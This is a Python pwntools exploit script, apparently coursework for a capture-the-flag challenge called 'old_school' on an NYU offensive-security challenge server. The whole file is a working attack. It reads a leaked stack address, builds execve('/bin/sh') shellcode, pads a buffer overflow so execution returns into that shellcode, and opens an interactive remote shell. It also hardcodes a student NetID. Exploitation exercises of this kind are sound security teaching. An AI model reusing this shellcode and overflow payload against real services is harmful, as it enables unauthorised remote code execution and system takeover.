from pwn import *

context.arch = 'amd64'

e = ELF("./old_school")

p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1290)

p.recvuntil(b'NetID (something like abc123): ')
p.sendline(b'vc2499')

p.recvuntil(b"My favorite string is at: ")
leaked_address = int(p.recvline().strip(), 16)
print(f"Leaked address: {hex(leaked_address)}")

shellcode = asm('''
    xor rax, rax
    mov rdi, 0x68732f6e69622f  # Push the string '/bin/sh' in reverse
    push rdi
    mov rdi, rsp               # Set RDI to point to '/bin/sh'
    xor rsi, rsi               # Set RSI to 0 (NULL)
    xor rdx, rdx               # Set RDX to 0 (NULL)
    mov rax, 0x3b              # Syscall number for execve
    syscall                    # Invoke the syscall
''')

padding = b'A' * 24                   
payload = shellcode + padding + p64(leaked_address)  

p.sendline(payload)
p.interactive()

